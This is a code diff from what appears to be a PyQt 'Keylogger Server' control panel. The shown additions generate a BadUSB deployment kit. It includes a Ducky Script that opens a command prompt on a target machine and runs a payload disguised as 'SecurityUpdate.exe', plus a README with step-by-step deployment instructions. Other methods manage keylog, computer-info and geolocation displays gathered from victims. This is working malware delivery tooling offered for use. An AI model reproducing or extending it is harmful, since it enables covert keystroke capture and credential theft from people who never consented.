+        # Create additional files
+        self._create_ducky_script(export_dir)
+        self._create_readme(export_dir)
+
+        # Cleanup
+        for folder in ['build', 'dist', '__pycache__']:
+            if os.path.exists(folder):
+                shutil.rmtree(folder, ignore_errors=True)
+        for file in ['SecurityUpdate.spec']:
+            if os.path.exists(file):
+                os.remove(file)
+
+        QMessageBox.information(
+            self, "Success!",
+            f"BadUSB package created!\n\n{export_dir}"
+        )
+
+        # Open folder
+        if os.name == "nt":
+            os.startfile(export_dir)
+
+    def _create_ducky_script(self, export_dir: str):
+        """Create Ducky Script for BadUSB"""
+        script = """REM BadUSB Payload - Automated Deployment
+LOCALE US
+DELAY 500
+GUI r
+DELAY 1000
+STRING cmd
+ENTER
+DELAY 1000
+STRING cd [!!!!!REPLACE WITH ACTUALL DESTINATION OF BADUSB FOLDER!!!!!]
+ENTER
+DELAY 1000
+STRING SecurityUpdate.exe
+ENTER
+DELAY 500
+ALT F4
+"""
+
+        with open(os.path.join(export_dir, "inject.txt"), "w") as f:
+            f.write(script)
+
+    def _create_readme(self, export_dir: str):
+        """Create README file"""
+        readme = """# BadUSB Deployment Package
+
+## Files Included
+- SecurityUpdate.exe: Compiled payload with embedded certificates
+- inject.txt: Ducky Script for BadUSB devices
+- README.md: This file
+
+## Deployment Steps
+1. Copy SecurityUpdate.exe to target or web server
+2. Update inject.txt with your server URL
+3. Flash inject.txt to BadUSB device
+4. Connect BadUSB to target machine
+
+## Security Notes
+- Uses mutual TLS authentication
+- All traffic encrypted
+- Client certificate validation enabled
+
+## Support
+Ensure server is running before deployment.
+"""
+        with open(os.path.join(export_dir, "README.md"), "w") as f:
+            f.write(readme)
+
+    def _open_email_info(self):
+        """Open email configuration window"""
+        self.email_window = QMainWindow()
+        self.email_ui = Ui_SetEmaiInfo()
+        self.email_ui.setupUi(self.email_window)
+        self.email_window.show()
+
+    def _refresh_logs(self):
+        """Clear all displays"""
+        self.keylog_display.clear()
+        self.computer_info_display.clear()
+        self.geo_location_display.clear()
+        print("[*] Logs cleared")
+
+    def _set_theme(self, theme: str):
+        """Set application theme"""
+        if theme == "light":
+            self.setStyleSheet("background-color: white; color: black;")
         else:
-            print(f"[!] Geo location display not available: {location}")
+            self.setStyleSheet("background-color: #2E2E2E; color: white;")
+        print(f"[*] Theme: {theme}")
+
+
+
+def main():
+    """Application entry point"""
+    app = QApplication(sys.argv)
+    app.setApplicationName("Keylogger Server")
+    app.setOrganizationName("SecurityTools")
+
+    window = MainWindow()
+    window.show()
+
+    sys.exit(app.exec_())
 
 
 if __name__ == "__main__":
-    app = QApplication(sys.argv)
-    main_window = MainWindow()
-    main_window.show()
-    sys.exit(app.exec_())
+    main()
